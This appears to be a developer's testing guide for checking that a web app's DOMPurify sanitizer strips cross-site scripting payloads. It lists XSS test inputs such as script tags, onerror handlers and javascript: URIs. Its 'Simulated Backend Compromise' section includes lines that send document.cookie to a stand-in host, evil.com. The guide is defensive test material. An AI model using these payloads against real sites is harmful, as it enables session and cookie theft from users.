# XSS Protection Testing Guide

## Prerequisites
- Wait for Cloudflare Pages to deploy the latest commit
- Open preview URL: https://claude-cors-mki32xzj397jdc1v.bouldersspaflow-preview.pages.dev/
- Open browser DevTools Console (F12)

## Test Cases

### Test 1: Verify DOMPurify is Loaded
```javascript
// Run in console - should return true
typeof window.sanitizeHTML === 'function'
```
**Expected:** `true`

---

### Test 2: Basic XSS Protection Test
```javascript
// Try to inject a script tag
const malicious = '<img src=x onerror="alert(\'XSS\')">Test</img>';
const safe = window.sanitizeHTML(malicious);
console.log('Input:', malicious);
console.log('Output:', safe);
```
**Expected Output:** Script/onerror removed, safe HTML only
```
Input: <img src=x onerror="alert('XSS')">Test</img>
Output: <img src="x">Test
```

---

### Test 3: Discount Code Injection (Critical)

1. Navigate to the discount code section on preview site
2. In console, simulate discount code with malicious content:
```javascript
// This simulates what would happen if API returned malicious discount code
const fakeDiscount = {
  code: '<script>alert("HACKED")</script>SUMMER2024',
  discount: 20
};

// Find where discount is displayed and check if it's sanitized
// The sanitizeHTML should strip the script tag
console.log('Sanitized:', window.sanitizeHTML(fakeDiscount.code));
```
**Expected:** Script tag removed, only "SUMMER2024" shown

---

### Test 4: Product Description XSS

```javascript
// Simulate malicious product description from API
const maliciousProduct = {
  name: 'Membership<script>alert("XSS")</script>',
  description: '<img src=x onerror="console.log(\'VULNERABLE\')">Great deal!'
};

console.log('Name sanitized:', window.sanitizeHTML(maliciousProduct.name));
console.log('Desc sanitized:', window.sanitizeHTML(maliciousProduct.description));
```
**Expected:**
```
Name sanitized: Membership
Desc sanitized: <img src="x">Great deal!
```

---

### Test 5: Translation Content XSS

```javascript
// Test translation with malicious HTML
const maliciousTranslation = 'Welcome <img src=x onerror="alert(\'XSS\')"> to Boulders';
const sanitized = window.sanitizeHTML(maliciousTranslation);
console.log('Translation:', sanitized);
```
**Expected:** Event handler removed, safe output

---

### Test 6: Real-World Test - Use the App

1. **Go through signup flow normally**
2. **Look for any XSS alerts/console errors**
3. **Check that:**
   - Product names display correctly
   - Descriptions show without scripts
   - Cart items render properly
   - Receipt displays safely

**Expected:** No XSS alerts, all content displays safely

---

### Test 7: Verify innerHTML Usage

```javascript
// Count sanitized innerHTML calls (should be 43)
fetch('/app.js')
  .then(r => r.text())
  .then(code => {
    const sanitized = (code.match(/innerHTML = sanitizeHTML\(/g) || []).length;
    const unsanitized = (code.match(/innerHTML = (?!sanitizeHTML)/g) || []).length;
    console.log('Sanitized innerHTML calls:', sanitized);
    console.log('Unsanitized innerHTML calls (should be ~27 empty strings):', unsanitized);
  });
```
**Expected:**
```
Sanitized innerHTML calls: 43
Unsanitized innerHTML calls: ~27 (only = '')
```

---

## Manual Security Test

Try entering these in any text input during signup:

1. `<script>alert('XSS')</script>`
2. `<img src=x onerror="alert('XSS')">`
3. `javascript:alert('XSS')`
4. `<iframe src="javascript:alert('XSS')"></iframe>`

**Expected:** None should execute, all should be sanitized

---

## What to Look For

### ✅ PASS Indicators:
- No alert() popups appear
- No errors in console about blocked scripts
- Content displays correctly without HTML tags
- Event handlers (onclick, onerror) are stripped

### ❌ FAIL Indicators:
- Alert boxes appear
- Console shows "VULNERABLE" or similar
- HTML/scripts execute
- Raw HTML tags visible in UI

---

## Critical Test: Simulated Backend Compromise

This tests if the app is protected even if the backend is compromised:

```javascript
// Simulate compromised API response
const compromisedProduct = {
  id: 123,
  name: 'Premium Membership',
  description: `
    <div>
      Great benefits!
      <script>
        // This should be blocked by sanitizeHTML
        fetch('https://evil.com/steal?data=' + document.cookie);
      </script>
      <img src=x onerror="fetch('https://evil.com/steal?cookie=' + document.cookie)">
    </div>
  `
};

const safe = window.sanitizeHTML(compromisedProduct.description);
console.log('Original:', compromisedProduct.description);
console.log('Sanitized:', safe);
```

**Expected:** All malicious code stripped, only safe HTML remains

---

## Success Criteria

- ✅ All 7 tests pass
- ✅ No XSS alerts appear during testing
- ✅ App functionality works normally
- ✅ Content displays safely

If all tests pass, XSS protection is working correctly! 🎉
